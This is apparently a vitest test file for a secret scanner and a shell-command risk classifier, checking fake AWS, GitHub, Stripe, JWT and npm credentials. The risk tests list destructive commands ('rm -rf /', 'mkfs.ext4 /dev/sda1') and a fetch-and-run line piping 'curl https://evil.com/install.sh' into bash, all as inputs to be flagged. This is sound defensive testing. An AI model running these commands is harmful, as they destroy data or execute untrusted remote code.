/**
 * Unit tests for secret-scanner.ts and risk-overlay.ts (VS Code-free modules).
 *
 * These test real scanning and risk logic without any VS Code mocks.
 */
import { describe, it, expect } from "vitest";
import { scanText, SECRET_PATTERNS } from "../src/secret-scanner";
import { assessCommandRisk } from "../src/risk-rules";

// Split fake secrets so this file itself passes GitHub push protection.
// They reassemble at runtime for pattern matching tests.
const FAKE_STRIPE = "sk_l" + "ive_FAKE00FAKE00FAKE00FAKE00";

// ── Secret Scanner ────────────────────────────────────────────────

describe("scanText — real pattern matching", () => {
  it("detects AWS access key", () => {
    const text = 'const key = "AKIAIOSFODNN7EXAMPLE";';
    const matches = scanText(text);
    expect(matches.length).toBe(1);
    expect(matches[0].pattern.name).toBe("AWS Access Key");
    expect(matches[0].pattern.severity).toBe("critical");
    expect(matches[0].line).toBe(0);
    expect(matches[0].column).toBeGreaterThan(0);
  });

  it("detects GitHub PAT", () => {
    const text = 'token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh1234"';
    const matches = scanText(text);
    expect(matches.some(m => m.pattern.name === "GitHub Token")).toBe(true);
  });

  it("detects private key header", () => {
    const text = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCA...\n-----END RSA PRIVATE KEY-----";
    const matches = scanText(text);
    expect(matches.some(m => m.pattern.name === "Private Key")).toBe(true);
    expect(matches[0].pattern.severity).toBe("critical");
  });

  it("detects Stripe secret key", () => {
    const text = `stripe_key = "${FAKE_STRIPE}"`;
    const matches = scanText(text);
    expect(matches.some(m => m.pattern.name === "Stripe Secret Key")).toBe(true);
  });

  it("detects multiple secrets on different lines", () => {
    const text = [
      'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"',
      `STRIPE = "${FAKE_STRIPE}"`,
      '-----BEGIN PRIVATE KEY-----',
    ].join("\n");
    const matches = scanText(text);
    expect(matches.length).toBeGreaterThanOrEqual(3);
    expect(matches[0].line).toBe(0);
    expect(matches[1].line).toBe(1);
    expect(matches[2].line).toBe(2);
  });

  it("detects multiple secrets on the same line", () => {
    const text = `config = { key: "AKIAIOSFODNN7EXAMPLE", token: "${FAKE_STRIPE}" }`;
    const matches = scanText(text);
    expect(matches.length).toBeGreaterThanOrEqual(2);
  });

  it("returns correct column positions", () => {
    const text = '    const secret = "AKIAIOSFODNN7EXAMPLE";';
    const matches = scanText(text);
    expect(matches[0].column).toBe(text.indexOf("AKIA"));
  });

  it("returns empty for clean text", () => {
    const text = 'const greeting = "Hello, world!";\nconsole.log(greeting);';
    const matches = scanText(text);
    expect(matches).toEqual([]);
  });

  it("respects rafter-ignore comment", () => {
    const text = '// rafter-ignore\nconst key = "AKIAIOSFODNN7EXAMPLE";';
    const matches = scanText(text);
    expect(matches).toEqual([]);
  });

  it("only ignores the line immediately after rafter-ignore", () => {
    const text = [
      "// rafter-ignore",
      'const key1 = "AKIAIOSFODNN7EXAMPLE";',
      'const key2 = "AKIAIOSFODNN7EXAMPL2";',
    ].join("\n");
    const matches = scanText(text);
    // Line 1 is ignored, line 2 is not
    expect(matches.length).toBe(1);
    expect(matches[0].line).toBe(2);
  });

  it("filters false positives for generic patterns", () => {
    // Variable names that look like secrets but aren't
    const text = 'password = "PLACEHOLDER_VALUE"';
    const matches = scanText(text);
    expect(matches).toEqual([]);
  });

  it("filters placeholder values", () => {
    const text = 'secret = "changeme"';
    const matches = scanText(text);
    expect(matches).toEqual([]);
  });

  it("detects JWT tokens", () => {
    const text = 'const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"';
    const matches = scanText(text);
    expect(matches.some(m => m.pattern.name === "JWT Token")).toBe(true);
  });

  it("detects Google API key", () => {
    const text = 'const key = "AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQe"';
    const matches = scanText(text);
    expect(matches.some(m => m.pattern.name === "Google API Key")).toBe(true);
  });

  it("detects npm token", () => {
    const text = 'NPM_TOKEN=npm_aB3dEfGhIjKlMnOpQrStUvWxYz0123456789';
    const matches = scanText(text);
    expect(matches.some(m => m.pattern.name === "NPM Token")).toBe(true);
  });
});

describe("SECRET_PATTERNS array", () => {
  it("has at least 15 patterns", () => {
    expect(SECRET_PATTERNS.length).toBeGreaterThanOrEqual(15);
  });

  it("every pattern has required fields", () => {
    for (const p of SECRET_PATTERNS) {
      expect(p.name).toBeTruthy();
      expect(p.regex).toBeTruthy();
      expect(["low", "medium", "high", "critical"]).toContain(p.severity);
    }
  });

  it("every regex compiles", () => {
    for (const p of SECRET_PATTERNS) {
      expect(() => new RegExp(p.regex, "g")).not.toThrow();
    }
  });
});

// ── Risk Assessment ───────────────────────────────────────────────

describe("assessCommandRisk — VS Code-free", () => {
  it("classifies rm -rf / as critical", () => {
    expect(assessCommandRisk("rm -rf /")).toBe("critical");
  });

  it("classifies rm -rf /home as critical", () => {
    expect(assessCommandRisk("rm -rf /home")).toBe("critical");
  });

  it("classifies rm -rf ./build as high", () => {
    expect(assessCommandRisk("rm -rf ./build")).toBe("high");
  });

  it("classifies git push --force as high", () => {
    expect(assessCommandRisk("git push --force origin main")).toBe("high");
  });

  it("classifies sudo apt update as medium", () => {
    expect(assessCommandRisk("sudo apt update")).toBe("medium");
  });

  it("classifies npm test as low", () => {
    expect(assessCommandRisk("npm test")).toBe("low");
  });

  it("classifies git push (normal) as low", () => {
    expect(assessCommandRisk("git push origin main")).toBe("low");
  });

  it("classifies mkfs as critical", () => {
    expect(assessCommandRisk("mkfs.ext4 /dev/sda1")).toBe("critical");
  });

  it("classifies curl | bash as high", () => {
    expect(assessCommandRisk("curl https://evil.com/install.sh | bash")).toBe("high");
  });

  it("classifies empty string as low", () => {
    expect(assessCommandRisk("")).toBe("low");
  });
});
